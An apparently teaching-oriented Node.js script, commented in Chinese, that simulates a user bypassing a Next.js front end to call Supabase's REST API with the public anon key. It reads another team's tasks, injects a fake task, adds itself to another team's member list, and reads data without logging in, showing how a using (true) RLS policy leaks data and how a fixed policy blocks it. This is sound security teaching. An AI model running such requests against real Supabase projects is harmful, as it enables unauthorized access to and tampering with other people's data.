// scripts/attack.mjs —— 全課最值得投影的一支腳本。
//
// 劇本：Alice 是一個合法使用者，但她今天很皮。她按 F12 打開 DevTools，
//       從網頁的 JS bundle 撿到 anon key，然後**完全不經過我們的 Next.js**，
//       用 curl 等級的 fetch 直接打 Supabase 的 REST API：
//         1. 查 tasks，把 where 拿掉
//         2. 硬塞 Beta 團隊的 team_id，把任務寫進別人的看板
//         3. 硬把自己塞進 Beta 團隊的名冊
//         4. 連登入都不登入，純 anon key 撈一次
//
// 漏洞版（npm run demo:break）：她全部得手。
// 正確版（npm run demo:fix）  ：同一支腳本，一條都不會過。
//
// 前端一行都沒改。差別只在資料庫裡那幾條政策的條件。
import { readFileSync, existsSync } from "node:fs";
import path from "node:path";
import { ROOT, loadEnv, c, die } from "./lib.mjs";

const env = loadEnv();
const statePath = path.join(ROOT, ".demo-seed.json");
if (!existsSync(statePath)) die("找不到 .demo-seed.json\n救援：先跑 npm run demo:seed");
const S = JSON.parse(readFileSync(statePath, "utf8"));

const API = env.url.replace(/\/$/, "");
const results = [];
const hr = (t = "") => console.log(c.gray("─".repeat(64)) + (t ? "\n" + t : ""));

function record(name, leaked, detail) {
  results.push({ name, leaked });
  const tag = leaked ? c.redbg(" 得手 ") : c.greenbg(" 擋下 ");
  console.log(`  ${tag} ${name}`);
  if (detail) console.log(detail);
}

async function rest(pathname, init = {}, token) {
  const res = await fetch(`${API}${pathname}`, {
    ...init,
    headers: {
      apikey: env.anonKey, // ← 這把 key 本來就公開，按 F12 誰都撿得到
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
      "Content-Type": "application/json",
      Prefer: "return=representation",
      ...(init.headers || {}),
    },
  });
  const text = await res.text();
  let body;
  try {
    body = JSON.parse(text);
  } catch {
    body = text;
  }
  return { status: res.status, body };
}

/**
 * 把上一次攻擊留下的痕跡清乾淨（假任務、硬塞進去的成員資格）。
 * 用 service_role 是因為它一定清得掉——不管現在跑的是漏洞版還是正確版政策。
 * 這一段是「課後清潔工」，不是攻擊的一部分：課堂上這支腳本要能重跑一百次都一樣。
 */
async function resetTraces() {
  const { createClient } = await import("@supabase/supabase-js");
  const admin = createClient(env.url, env.serviceKey, {
    auth: { autoRefreshToken: false, persistSession: false },
  });
  await admin.from("tasks").delete().like("title", "%ATTACK-DEMO%");
  await admin.from("team_members").delete().eq("team_id", S.bob.teamId).eq("user_id", S.alice.id);
}

async function main() {
  await resetTraces();
  console.log("\n" + c.bold("🕵️  模擬攻擊：不經過 Next.js，直接打 Supabase REST API"));
  hr();
  console.log(`  目標    ${API}/rest/v1/tasks`);
  console.log(`  anon key（F12 從 JS bundle 撿的）  ${c.gray(env.anonKey.slice(0, 32) + "…")}`);
  console.log(`  攻擊者  ${S.alice.email}（合法帳號，但想偷看 ${S.bob.teamName}）`);
  hr();

  // ── 0. 登入拿 JWT（這一步完全合法，任何使用者都做得到）────────────
  const login = await rest(`/auth/v1/token?grant_type=password`, {
    method: "POST",
    body: JSON.stringify({ email: S.alice.email, password: S.password }),
  });
  if (!login.body?.access_token) die(`登入失敗：${JSON.stringify(login.body)}\n救援：npm run demo:seed`);
  const jwt = login.body.access_token;
  console.log(`\n  ${c.green("✓")} 已用 Alice 的帳密換到 JWT（房卡）\n`);

  // ── 1. 把 where 拿掉，硬查整張 tasks ────────────────────────────
  hr(c.bold("  攻擊 1／4　GET /rest/v1/tasks?select=*  （沒有任何 where）"));
  const all = await rest(`/rest/v1/tasks?select=id,title,status,team_id&order=title`, {}, jwt);
  const rows = Array.isArray(all.body) ? all.body : [];
  const stolen = rows.filter((r) => r.team_id === S.bob.teamId);
  console.log(c.gray(`  HTTP ${all.status}，回傳 ${rows.length} 筆`));
  for (const r of rows) {
    const mine = r.team_id === S.alice.teamId;
    console.log(
      `    ${mine ? c.gray("[自己的]") : c.red("[別團隊!]")} ${mine ? c.gray(r.title) : c.red(r.title)}`
    );
  }
  record(
    `讀走 ${S.bob.teamName} 的任務`,
    stolen.length > 0,
    stolen.length > 0
      ? c.red(`         → 偷到 ${stolen.length} 筆機密任務，包含「${stolen[0].title}」`)
      : c.green(`         → 只看得到自己團隊的 ${rows.length} 筆，Beta 的任務對她「不存在」`)
  );

  // ── 2. 硬塞別人的 team_id，把任務寫進別人的看板 ──────────────────
  hr(c.bold(`  攻擊 2／4　POST /rest/v1/tasks  （team_id 硬塞成 Beta 團隊）`));
  const inject = await rest(
    `/rest/v1/tasks`,
    {
      method: "POST",
      body: JSON.stringify({
        team_id: S.bob.teamId,
        title: "😈 [ATTACK-DEMO] Alice 塞進 Beta 看板的假任務",
        created_by: S.alice.id,
      }),
    },
    jwt
  );
  console.log(c.gray(`  HTTP ${inject.status}`));
  const injected = inject.status >= 200 && inject.status < 300;
  record(
    "把假任務寫進別人的看板",
    injected,
    injected
      ? c.red(`         → 201 Created。Bob 明天打開看板會看到這張憑空出現的卡片`)
      : c.green(`         → ${inject.status}　${inject.body?.message || inject.body?.code || ""}`)
  );
  // ── 3. 硬把自己塞進別人的團隊名冊 ───────────────────────────────
  hr(c.bold(`  攻擊 3／4　POST /rest/v1/team_members  （把自己加進 Beta 團隊）`));
  const join = await rest(
    `/rest/v1/team_members`,
    {
      method: "POST",
      body: JSON.stringify({ team_id: S.bob.teamId, user_id: S.alice.id, role: "member" }),
    },
    jwt
  );
  console.log(c.gray(`  HTTP ${join.status}`));
  const joined = join.status >= 200 && join.status < 300;
  record(
    "沒有邀請碼就加入別人的團隊",
    joined,
    joined
      ? c.red(`         → 加入成功。從此 Beta 團隊的一切她都是「自己人」`)
      : c.green(`         → ${join.status}　${join.body?.message || join.body?.code || ""}`)
  );
  // ── 4. 連登入都不登入，純 anon key ──────────────────────────────
  hr(c.bold("  攻擊 4／4　GET /rest/v1/tasks  （完全未登入，只帶 anon key）"));
  const anon = await rest(`/rest/v1/tasks?select=id,title`, {});
  const anonRows = Array.isArray(anon.body) ? anon.body : [];
  console.log(c.gray(`  HTTP ${anon.status}，回傳 ${anonRows.length} 筆`));
  record(
    "未登入的路人撈走全站任務",
    anonRows.length > 0,
    anonRows.length > 0
      ? c.red(`         → 路人甲拿到 ${anonRows.length} 筆，例如「${anonRows[0].title}」`)
      : c.green(`         → []　auth.uid() 是 null，一列都對不上，全部隱形`)
  );

  // ── 結論 ────────────────────────────────────────────────────────
  await resetTraces(); // 收拾乾淨，下一次示範才是同樣的起點
  const breached = results.filter((r) => r.leaked).length;
  console.log("");
  if (breached > 0) {
    console.log(c.redbg(`  ☠️  四項攻擊有 ${breached} 項得手——這個資料庫等於沒有鎖  `));
    console.log(c.red(`\n  注意：RLS 明明是 Enabled。差別只在政策條件寫成 using (true)。`));
    console.log(c.yellow(`  下一步：npm run demo:fix，然後一字不改再跑一次這支腳本。\n`));
  } else {
    console.log(c.greenbg(`  🛡️  四項攻擊全數被資料庫擋下——而且前端一行都沒改  `));
    console.log(c.green(`\n  擋住她的不是 Next.js，是 tasks / team_members 政策裡的 auth.uid()。`));
    console.log(c.gray(`  這就是為什麼看板頁查任務可以連 where 都不用加。\n`));
  }
  process.exitCode = 0;
}

main();
